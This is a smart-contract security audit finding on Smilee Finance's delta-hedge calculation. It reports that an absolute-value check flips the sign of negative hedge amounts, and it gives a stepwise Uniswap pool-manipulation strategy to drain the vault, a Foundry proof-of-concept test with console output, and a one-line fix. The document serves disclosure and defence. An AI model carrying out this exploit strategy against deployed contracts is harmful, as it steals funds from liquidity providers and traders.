Rural Blonde Cougar

high

# The sign of delta hedge amount can be reversed by malicious user due to incorrect condition in `FinanceIGDelta.deltaHedgeAmount`

## Summary

When delta hedge amount is calculated after the trade, the final check is to account for sqrt computation error and ensure the exchanged amount of side token doesn't exceed amount of side tokens the vault has. The issue is that this check is incorrect: it compares absolute value of the delta hedge amount, but always sets positive amount of side tokens if the condition is true. If the delta hedge amount is negative, this final check will reverse the sign of the delta hedge amount, messing up the hedged assets the protocol has.

As a result, if the price moves significantly before the next delta hedge, protocol might not have enough funds to pay off users due to incorrect hedging. It also allows the user to manipulate underlying uniswap pool, then force the vault to delta hedge large amount at very bad price while trading tiny position of size 1 wei, without paying any fees. Repeating this process, the malicious user can drain/steal all funds from the vault in a very short time.

## Vulnerability Detail

The final check in calculating delta hedge amount in `FinanceIGDelta.deltaHedgeAmount` is:
```solidity
    // due to sqrt computation error, sideTokens to sell may be very few more than available
    if (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {
        if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {
            tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);
        }
    }
```

The logic is that if due to small computation errors, delta hedge amount (to sell side token) can slightly exceed amount of side tokens the vault has, when in reality it means to just sell all side tokens the vault has, then delta hedge amount should equal to side tokens amount vault has.

The issue here is that only positive delta hedge amount means vault has to sell side tokens, while negative amount means it has to buy side tokens. But the condition compares `abs(tokensToSwap)`, meaning that if the delta hedge amount is negative, but in absolute value very close to side tokens amount the vault has, then the condition will also be true, which will set `tokensToSwap` to a positive amount of side tokens, i.e. will reverse the delta hedge amount from `-sideTokens` to `+sideTokens`.

It's very easy for malicious user to craft such situation. For example, if current price is significantly greater than strike price, and there are no other open trades, simply buy IG bull options for 50% of the vault amount. Then buy IG bull options for another 50%. The first trade will force the vault to buy ETH for delta hedge, while the second trade will force the vault to sell the same ETH amount instead of buying it. If there are open trades, it's also easy to calculate the correct proportions of the trades to make `delta hedge amount = -side tokens`.

Once the vault incorrectly hedges after malicious user's trade, there are multiple bad scenarios which will harm the protocol. For example:
1. If no trade happens for some time and the price increases, the protocol will have no side tokens to hedge, but the bull option buyers will still receive their payoff, leaving vault LPs in a loss, up to a situation when the vault will not have enough funds to even pay the option buyers payoff.
2. Malicious user can abuse the vault's incorrect hedge to directly profit from it. After the trade described above, any trade, even 1 wei trade, will make vault re-hedge with the correct hedge amount, which can be a significant amount. Malicious user can abuse it by manipulating the underlying uniswap pool:
2.1. Buy underlying uniswap pool up to the edge of allowed range (say, +1.8% of current price, average price of ETH bought = +0.9% of current price)
2.2. Provide uniswap liquidity in that narrow range (+1.8%..+2.4%)
2.3. Open/close any position in IG with amount = 1 wei (basically paying no fees) -> this forces the vault to delta hedge (buy) large amount of ETH at inflated price ~+2% of the current price.
2.5. Remove uniswap liquidity.
2.6. Sell back in the uniswap pool.
2.7. During the delta hedge, uniswap position will buy ETH (uniswap liquidity will sell ETH) at the average price of +2.1% of the current price, also receiving pool fees. The fees for manipulating the pool and "closing" position via providing liquidity will cancel out and overall profit will be: +2.1% - 0.9% = +1.2% of the delta hedge amount.

The strategy can be enchanced to optimize the profitability, but the idea should be clear.

## Impact

Malicious user can steal all vault funds, and/or the vault LPs will incur losses higher than uniswap LPs or vault will be unable to payoff the traders due to incorrect hedged amount.

## Proof Of Concept

Copy to `attack.t.sol`:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {UD60x18, ud, convert} from "@prb/math/UD60x18.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPositionManager} from "@project/interfaces/IPositionManager.sol";
import {Epoch} from "@project/lib/EpochController.sol";
import {AmountsMath} from "@project/lib/AmountsMath.sol";
import {EpochFrequency} from "@project/lib/EpochFrequency.sol";
import {OptionStrategy} from "@project/lib/OptionStrategy.sol";
import {AddressProvider} from "@project/AddressProvider.sol";
import {MarketOracle} from "@project/MarketOracle.sol";
import {FeeManager} from "@project/FeeManager.sol";
import {Vault} from "@project/Vault.sol";
import {TestnetToken} from "@project/testnet/TestnetToken.sol";
import {TestnetPriceOracle} from "@project/testnet/TestnetPriceOracle.sol";
import {DVPUtils} from "./utils/DVPUtils.sol";
import {TokenUtils} from "./utils/TokenUtils.sol";
import {Utils} from "./utils/Utils.sol";
import {VaultUtils} from "./utils/VaultUtils.sol";
import {MockedIG} from "./mock/MockedIG.sol";
import {MockedRegistry} from "./mock/MockedRegistry.sol";
import {MockedVault} from "./mock/MockedVault.sol";
import {TestnetSwapAdapter} from "@project/testnet/TestnetSwapAdapter.sol";
import {PositionManager} from "@project/periphery/PositionManager.sol";


contract IGVaultTest is Test {
    using AmountsMath for uint256;

    address admin = address(0x1);

    // User of Vault
    address alice = address(0x2);
    address bob = address(0x3);

    //User of DVP
    address charlie = address(0x4);
    address david = address(0x5);

    AddressProvider ap;
    TestnetToken baseToken;
    TestnetToken sideToken;
    FeeManager feeManager;

    MockedRegistry registry;

    MockedVault vault;
    MockedIG ig;
    TestnetPriceOracle priceOracle;
    TestnetSwapAdapter exchange;
    uint _strike;

    function setUp() public {
        vm.warp(EpochFrequency.REF_TS);
        //ToDo: Replace with Factory
        vm.startPrank(admin);
        ap = new AddressProvider(0);
        registry = new MockedRegistry();
        ap.grantRole(ap.ROLE_ADMIN(), admin);
        registry.grantRole(registry.ROLE_ADMIN(), admin);
        ap.setRegistry(address(registry));

        vm.stopPrank();

        vault = MockedVault(VaultUtils.createVault(EpochFrequency.DAILY, ap, admin, vm));
        priceOracle = TestnetPriceOracle(ap.priceOracle());

        baseToken = TestnetToken(vault.baseToken());
        sideToken = TestnetToken(vault.sideToken());

        vm.startPrank(admin);
       
        ig = new MockedIG(address(vault), address(ap));
        ig.grantRole(ig.ROLE_ADMIN(), admin);
        ig.grantRole(ig.ROLE_EPOCH_ROLLER(), admin);
        vault.grantRole(vault.ROLE_ADMIN(), admin);
        vm.stopPrank();
        ig.setOptionPrice(1e3);
        ig.setPayoffPerc(0.1e18); // 10 % -> position paying 1.1
        ig.useRealDeltaHedge();
        ig.useRealPercentage();
        ig.useRealPremium();

        DVPUtils.disableOracleDelayForIG(ap, ig, admin, vm);

        vm.prank(admin);
        registry.registerDVP(address(ig));
        vm.prank(admin);
        MockedVault(vault).setAllowedDVP(address(ig));
        feeManager = FeeManager(ap.feeManager());

        exchange = TestnetSwapAdapter(ap.exchangeAdapter());
    }

    function testIncorrectDeltaHedge() public {
        _strike = 1e18;
        VaultUtils.addVaultDeposit(alice, 1e18, admin, address(vault), vm);
        VaultUtils.addVaultDeposit(bob, 1e18, admin, address(vault), vm);

        Utils.skipDay(true, vm);

        vm.prank(admin);
        ig.rollEpoch();

        VaultUtils.logState(vault);
        DVPUtils.debugState(ig);

        testBuyOption(1.09e18, 0.5e18, 0);
        testBuyOption(1.09e18, 0.5e18, 0);
    }

    function testBuyOption(uint price, uint128 optionAmountUp, uint128 optionAmountDown) internal {

        vm.prank(admin);
        priceOracle.setTokenPrice(address(sideToken), price);

        (uint256 premium, uint256 fee) = _assurePremium(charlie, _strike, optionAmountUp, optionAmountDown);

        vm.startPrank(charlie);
        premium = ig.mint(charlie, _strike, optionAmountUp, optionAmountDown, premium, 1e18, 0);
        vm.stopPrank();

        console.log("premium", premium);
        VaultUtils.logState(vault);
    }

    function testSellOption(uint price, uint128 optionAmountUp, uint128 optionAmountDown) internal {
        vm.prank(admin);
        priceOracle.setTokenPrice(address(sideToken), price);

        uint256 charliePayoff;
        uint256 charliePayoffFee;
        {
            vm.startPrank(charlie);
            (charliePayoff, charliePayoffFee) = ig.payoff(
                ig.currentEpoch(),
                _strike,
                optionAmountUp,
                optionAmountDown
            );

            charliePayoff = ig.burn(
                ig.currentEpoch(),
                charlie,
                _strike,
                optionAmountUp,
                optionAmountDown,
                charliePayoff,
                0.1e18
            );
            vm.stopPrank();

            console.log("payoff received", charliePayoff);
        }

        VaultUtils.logState(vault);
    }

    function _assurePremium(
        address user,
        uint256 strike,
        uint256 amountUp,
        uint256 amountDown
    ) private returns (uint256 premium_, uint256 fee) {
        (premium_, fee) = ig.premium(strike, amountUp, amountDown);
        TokenUtils.provideApprovedTokens(admin, address(baseToken), user, address(ig), premium_*2, vm);
    }
}
```

Execution console:
```solidity
  baseToken balance 1000000000000000000
  sideToken balance 1000000000000000000
...
  premium 0
  baseToken balance 2090000000000000000
  sideToken balance 0
...
  premium 25585649987654406
  baseToken balance 1570585649987654474
  sideToken balance 499999999999999938
...
  premium 25752512349788475
  baseToken balance 2141338162337442881
  sideToken balance 0
...
  premium 0
  baseToken balance 1051338162337442949
  sideToken balance 999999999999999938
...
```

Notice:
1. First trade (amount = 1 wei) settles delta-hedge at current price (1.09): sideToken = 0 because price is just above kB
2. 2nd trade (buy ig bull amount = 0.5) causes delta-hedge of buying 0.5 side token
3. 3rd trade (buy ig bull amount = 0.5) causes delta-hedge of **selling** 0.5 side token (instead of buying 0.5)
4. Last trade (amount = 1 wei) causes vault to buy 1 side token for correct delta-hedge (but at 0 fee to user).

## Code Snippet

`FinanceIGDelta.deltaHedgeAmount` incorrect condition:
https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/lib/FinanceIGDelta.sol#L109-L114

## Tool used

Manual Review

## Recommendation

The check should be done only when `tokensToSwap` is positive:
```solidity
        // due to sqrt computation error, sideTokens to sell may be very few more than available
-       if (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {
+       if (tokensToSwap > 0 && SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {
            if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {
                tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);
            }
        }
```